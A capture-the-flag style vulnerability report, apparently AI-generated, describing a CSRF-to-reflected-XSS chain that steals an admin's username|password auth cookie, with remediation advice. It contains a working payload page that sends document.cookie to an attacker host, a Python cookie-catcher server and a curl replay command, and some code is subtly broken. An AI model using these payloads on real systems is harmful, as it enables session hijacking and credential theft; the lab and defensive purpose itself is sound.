THIS REPORT IS JUST FOR LEARNING POURPOSES


***Report 1: CSRF-4 - CSRF to XSS Leading to Session Cookie Theft***

_______Vulnerability Report: CSRF to Stored XSS Leading to Admin Session Cookie Theft_______
Severity: High
CVSS Score: 8.3 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:L)
CWE: CWE-352 (Cross-Site Request Forgery), CWE-79 (Cross-Site Scripting), CWE-200 (Exposure of Sensitive Information)
Affected Endpoint: /ephemeral (GET), /publish (GET)
Vector Chain: CSRF → Reflected XSS → Cookie Exfiltration

___Summary___
A Cross-Site Request Forgery (CSRF) vulnerability exists in the /ephemeral endpoint, allowing an attacker to inject malicious 
JavaScript into the response. This can be chained to create a Reflected XSS attack that exfiltrates the victim's session cookie 
to an attacker-controlled server. The stolen cookie can then be used to hijack the admin session and access sensitive functionality.
The authentication mechanism relies on a cookie (auth=username|password) which is not HttpOnly, making cookie theft trivial once XSS is achieved.

*Vulnerability Details*
____1. Cross-Site Request Forgery (CSRF) - /ephemeral____
The /ephemeral endpoint accepts GET requests with a msg parameter and renders the input directly in the response without CSRF tokens
or validation. This allows an attacker to craft a malicious page that triggers this request when visited by an authenticated user.

Vulnerable Code

python
@app.route("/ephemeral", methods=["GET"])
def challenge_ephemeral():
    return f"""
        <html><body>
        <h1>You have received an ephemeral message!</h1>
        The message: {flask.request.args.get("msg", "(none)")}
        </body></html>
    """
*Issue: The msg parameter is directly concatenated into the HTML response without sanitization or escaping.

____2. Reflected Cross-Site Scripting (XSS)_____
The direct reflection allows an attacker to inject arbitrary HTML and JavaScript into the response.

Proof of Concept:
text
http://challenge.localhost/ephemeral?msg=<img src=x onerror=alert('XSS')>


______3. Session Cookie Vulnerability______
The authentication cookie is set without the HttpOnly flag, making it accessible via JavaScript's document.cookie.

python
response.set_cookie('auth', username+"|"+password)
The cookie contains sensitive credentials in the format username|password.

***Proof of Concept***
Attack Flow:

1.Attacker hosts a malicious page at http://hacker.localhost:1337/
2.Victim (authenticated admin) visits the attacker's page
3.Attacker's page uses CSRF to redirect the victim to the /ephemeral endpoint with an XSS payload
4.XSS payload executes in victim's browser, stealing the auth cookie
5.Attacker receives the cookie on their server
6.Attacker uses the cookie to authenticate as the admin

________Malicious HTML Page (index.html)________
html
<!DOCTYPE html>
<html>
<body>
    <script>
        // Build the XSS payload that steals the cookie
        var payload = "<img src=x onerror='new Image().src(\"http://hacker.localhost:1337/\"%2Bdocument.cookie)'>";
        
        // CSRF redirect to trigger the reflected XSS
        window.location.href = "http://challenge.localhost/ephemeral?msg=" + encodeURIComponent(payload);
    </script>
</body>
</html>
Cookie Catcher Server (server.py)
python
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class CookieHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if '/steal' in self.path or 'auth=' in self.path:
            query = urllib.parse.urlparse(self.path).query
            params = urllib.parse.parse_qs(query)
            cookie = params.get('c', [''])[0] or self.path.split('/')[-1]
            print(f"\n[!] STOLEN COOKIE: {cookie}\n")
        
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(b'OK')

server = HTTPServer(('0.0.0.0', 1337), CookieHandler)
server.serve_forever()


________Host Malicious Page:_______

Save the index.html content in the server's directory

Trigger Attack:

1.Navigate to /challenge/victim or have an admin visit http://hacker.localhost:1337/
2.Observe the attacker's server logs for the stolen cookie
3.Session Hijacking:

bash
curl -H "Cookie: auth=admin|{stolen_password}" http://challenge.localhost/


Exfiltrated Data Format
The attacker receives:

text
auth=admin|pwn.college{...}

___Impact___
Impact Area                               	Description
Authentication                              Bypass	Attacker can impersonate any user, including admin
Data Exposure                              	Full access to all posts and user data
Privilege Escalation	                      Admin privileges can be used to perform unauthorized actions
Account Takeover	                          Complete control over the admin account

__Severity Justification__
Attack Vector:                               Remote (Network)
Attack Complexity:                           Low
Privileges Required:                         None
User Interaction:                            Required (victim visits malicious page)
Confidentiality Impact:                      High (complete session theft)
Integrity Impact:                            High (ability to perform admin actions)
Availability Impact:                         Low

___Remediation Recommendations___

1. Implement CSRF Tokens
For /ephemeral and all state-changing endpoints:

python
import secrets
@app.route("/ephemeral", methods=["GET"])
def challenge_ephemeral():
    token = secrets.token_urlsafe(32)
    flask.session['csrf_token'] = token
    # Require token for GET requests with user input
    if flask.request.args.get('msg'):
        # Validate CSRF token (if implemented)
        pass

        
2. Sanitize User Input
python
from markupsafe import escape

@app.route("/ephemeral", methods=["GET"])
def challenge_ephemeral():
    msg = flask.request.args.get("msg", "(none)")
    escaped_msg = escape(msg)  # Prevents XSS
    return f"""
        <html><body>
        <h1>You have received an ephemeral message!</h1>
        The message: {escaped_msg}
        </body></html>
    """

3. Set HttpOnly Cookie
python
response.set_cookie(
    'auth', 
    username + "|" + password,
    httponly=True,      # Prevents JavaScript access
    secure=True,        # Only over HTTPS
    samesite='Strict'   # Prevents CSRF
)


4. Content Security Policy (CSP)
http
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'

6. Avoid Storing Passwords in Cookies
Use a session-based approach with a random, server-side token instead of storing credentials client-side.

Additional Notes
The issue is amplified by the lack of HttpOnly on the session cookie
The cookie contains the actual password (last 20 chars of the flag), which is a critical security flaw

CSRF protection should be implemented on all endpoints that perform state-changing actions
u've successfully completed the module and now have the skills to write professional reports. 
These reports are exactly what bug bounty programs expect from researchers. Good luck with your bug bounty journey! 

***This response is AI-generated, for reference only.***
